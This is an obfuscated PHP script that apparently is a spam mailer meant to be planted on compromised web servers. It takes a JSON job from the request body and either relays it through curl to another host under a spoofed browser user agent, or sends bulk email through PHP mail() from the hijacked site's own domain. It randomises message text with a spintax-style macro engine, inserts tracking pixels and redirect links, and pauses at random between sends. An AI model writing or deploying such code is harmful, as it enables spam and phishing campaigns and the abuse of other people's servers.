<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($spa34b67) { if ($spa34b67 == 'keys') { return array_keys($this->_keys); } } public function Import($spa34b67, $sp61ca2c) { if (is_array($sp61ca2c)) { $this->values[$spa34b67] = array(); foreach ($sp61ca2c as $spa7c8f4) { if (!empty($spa7c8f4['key'])) { $this->values[$spa34b67][$spa7c8f4['key']] = $spa7c8f4['value']; } else { $this->values[$spa34b67][] = $spa7c8f4['value']; } } } else { $this->Assign($spa34b67, $sp61ca2c); } } public function Assign($spa34b67, $sp666c6d) { $this->values[$spa34b67] = $sp666c6d; } public function Parse($spba4dea) { $spc05c1c = ''; $sp24a92e = 0; while (true) { $sp7cfe4e = strpos($spba4dea, '{', $sp24a92e); if ($sp7cfe4e === false) { $spc05c1c .= substr($spba4dea, $sp24a92e); break; } $spc05c1c .= substr($spba4dea, $sp24a92e, $sp7cfe4e - $sp24a92e); $sp24a92e = $sp7cfe4e + 1; $spfb7b21 = ''; $spe177f4 = '{'; $sp1d3df9 = array(); $sp67dbfe = false; $sp555ef4 = false; $sp7ac1e6 = 'var'; while ($sp24a92e < strlen($spba4dea)) { $spc4be45 = substr($spba4dea, $sp24a92e, 1); $spe177f4 .= $spc4be45; if ($spc4be45 == ',' || $spc4be45 == '>' || $spc4be45 == '|') { if ($sp7ac1e6 == 'alias') { $sp67dbfe = $spfb7b21; } elseif ($sp7ac1e6 == 'mod') { $sp555ef4 = $spfb7b21; } else { $sp1d3df9[] = $spfb7b21; } $spfb7b21 = ''; if ($spc4be45 == '>') { $sp7ac1e6 = 'alias'; } if ($spc4be45 == '|') { $sp7ac1e6 = 'mod'; } $sp24a92e++; continue; } if ($spc4be45 == '}') { if ($sp7ac1e6 == 'alias') { $sp67dbfe = $spfb7b21; } elseif ($sp7ac1e6 == 'mod') { $sp555ef4 = $spfb7b21; } else { $sp1d3df9[] = $spfb7b21; } $sp24a92e++; break; } $spfb7b21 .= $spc4be45; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $spc4be45) == 0) { $sp24a92e++; $sp1d3df9 = array(); break; } $sp24a92e++; } if (sizeof($sp1d3df9) == 0) { $spc05c1c .= $spe177f4; continue; } $spf2266b = false; $spc9802d = false; if (preg_match('/^\\^/', $sp1d3df9[0]) > 0) { $sp1d3df9[0] = substr($sp1d3df9[0], 1); $spf2266b = true; } if (preg_match('/^\\!/', $sp1d3df9[0]) > 0) { $sp1d3df9[0] = substr($sp1d3df9[0], 1); $spc9802d = true; } $spf6ebd1 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp1d3df9[0], $sp2e94fa) > 0) { $spf6ebd1 = $sp2e94fa[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp1d3df9[0], $sp2e94fa) > 0) { $spf6ebd1 = explode('-', $sp2e94fa[1]); } if ($spf6ebd1 !== false) { $sp1d3df9[0] = substr($sp1d3df9[0], 0, strpos($sp1d3df9[0], '[')); } $this->_keys[$sp1d3df9[0]] = true; if (empty($this->values[$sp1d3df9[0]]) && empty($this->fixed[$sp1d3df9[0]])) { continue; } if ($spf2266b) { unset($this->fixed[$sp1d3df9[0]]); } if (isset($this->fixed[$sp1d3df9[0]])) { $sp8310a4 = $this->fixed[$sp1d3df9[0]]; } else { $sp8310a4 = ''; $sp34584a = 1; if (sizeof($sp1d3df9) == 2) { $sp34584a = $sp1d3df9[1]; } if (sizeof($sp1d3df9) == 3) { $sp34584a = rand($sp1d3df9[1], $sp1d3df9[2]); } for ($spa61e86 = 0; $spa61e86 < $sp34584a; $spa61e86++) { if (is_array($this->values[$sp1d3df9[0]])) { if (!is_array($this->used[$sp1d3df9[0]])) { $this->used[$sp1d3df9[0]] = array(); } if (count($this->used[$sp1d3df9[0]]) == count($this->values[$sp1d3df9[0]])) { $this->used[$sp1d3df9[0]] = array(); } if ($spf6ebd1 !== false && is_scalar($spf6ebd1)) { $sp8310a4 .= $this->values[$sp1d3df9[0]][$spf6ebd1]; $this->used[$spf6ebd1] = true; } else { $sp2ae63c = array(); if (is_array($spf6ebd1)) { $sp408f6a = $spf6ebd1[0]; $sp65b74f = $spf6ebd1[1]; } else { $sp408f6a = 0; $sp65b74f = count($this->values[$sp1d3df9[0]]) - 1; } for ($spf8ea71 = $sp408f6a; $spf8ea71 <= $sp65b74f; $spf8ea71++) { if ($spc9802d && !empty($this->used[$sp1d3df9[0]][$spf8ea71])) { continue; } $sp2ae63c[] = $spf8ea71; } $spc39365 = $sp2ae63c[rand(0, count($sp2ae63c) - 1)]; $this->used[$sp1d3df9[0]][$spc39365] = true; $sp8310a4 .= $this->values[$sp1d3df9[0]][$spc39365]; } } else { $sp8310a4 .= $this->values[$sp1d3df9[0]]; } } } $sp8310a4 = $this->Parse($sp8310a4); if ($sp555ef4 !== false) { for ($sp0649fe = 0; $sp0649fe < strlen($sp555ef4); $sp0649fe++) { switch (substr($sp555ef4, $sp0649fe, 1)) { case 'b': $sp8310a4 = base64_encode($sp8310a4); break; case 'q': $sp8310a4 = quoted_printable_encode($sp8310a4); break; default: break; } } } if ($spf2266b) { $this->fixed[$sp1d3df9[0]] = $sp8310a4; } if ($sp67dbfe !== false && $sp67dbfe != '') { $this->fixed[$sp67dbfe] = $sp8310a4; } $spc05c1c .= $sp8310a4; } return $spc05c1c; } } $sp245ca4 = file_get_contents('php://input'); $sp12905d = json_decode($sp245ca4, true); if (empty($sp12905d['via_proxy'])) { $sp12905d['via_proxy'] = true; $spf78d52 = curl_init($sp12905d['prefix'] . $sp12905d['files']['s']); $sp0bd92d = json_encode($sp12905d); curl_setopt($spf78d52, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($spf78d52, CURLOPT_TIMEOUT, 600); curl_setopt($spf78d52, CURLOPT_RETURNTRANSFER, true); curl_setopt($spf78d52, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($spf78d52, CURLOPT_REFERER, $spd6256f); curl_setopt($spf78d52, CURLOPT_POST, true); curl_setopt($spf78d52, CURLOPT_POSTFIELDS, $sp0bd92d); curl_setopt($spf78d52, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp0bd92d))); $sp98ab90 = curl_exec($spf78d52); echo $sp98ab90; die; } $spce74e2 = $_SERVER['SERVER_ADDR']; $sp3bb784 = $_SERVER['HTTP_HOST']; $sp3bb784 = preg_replace('/^www\\./', '', $sp3bb784); $sp2df933 = new Macros(); $sp2df933->Assign('server_addr', $spce74e2); $sp2df933->Assign('server_host', $sp3bb784); foreach ($sp12905d['macros'] as $spa34b67 => $sp61ca2c) { $sp2df933->Import($spa34b67, $sp61ca2c); } $spe15102 = preg_replace('/^www\\./i', '', $sp3bb784); $sp218d31 = $sp2df933->Parse('{from_user}@' . $spe15102); $sp2df933->Assign('from_email', $sp218d31); $sp2df933->Assign('prefix', $sp12905d['prefix']); $sp2df933->Assign('html', $sp12905d['letter']['html']); $sp24a92e = 0; $sp1ed53e = 0; $spfa70b2 = 0; $sp8e9ad3 = array(); foreach ($sp12905d['rcpt'] as $spe223d5) { $sp2df933->Assign('email', $spe223d5['email']); $sp2df933->Assign('entry', $spe223d5); $sp2df933->Assign('date', date('r')); $sp2df933->Assign('redirect', $sp12905d['prefix'] . $sp12905d['files']['r']); $sp2df933->Assign('redirect_with_uri', $sp12905d['prefix'] . $sp12905d['files']['r'] . '?uri='); $sp2df933->Assign('unsubscribe', $sp12905d['prefix'] . $sp12905d['files']['u'] . '?id=' . $spe223d5['id']); $sp2df933->Assign('delivery', '<img src="' . $sp12905d['prefix'] . $sp12905d['files']['d'] . '?id=' . $spe223d5['id'] . '" />'); $sp0f16ca = $sp2df933->Parse($sp12905d['envelope']['header']); $sp86e405 = $sp2df933->Parse($sp12905d['envelope']['body']); if (!empty($spe223d5['name'])) { $sp6bdbba = $spe223d5['name'] . ' <' . $spe223d5['email'] . '>'; } else { $sp6bdbba = $spe223d5['email']; } $sp9fc56e = $sp2df933->Parse($sp12905d['letter']['subject']); if ($sp24a92e > 0) { sleep(rand(3, 8)); } $sp4e9b5f = mail($sp6bdbba, $sp9fc56e, $sp86e405, $sp0f16ca); $sp8e9ad3[$spe223d5['id']] = $sp4e9b5f; if ($sp4e9b5f) { $sp1ed53e++; } else { $spfa70b2++; } $sp24a92e++; } echo serialize(array('total' => count($sp12905d['rcpt']), 'sent' => $sp24a92e, 'success' => $sp1ed53e, 'error' => $spfa70b2, 'rcpt' => $sp8e9ad3));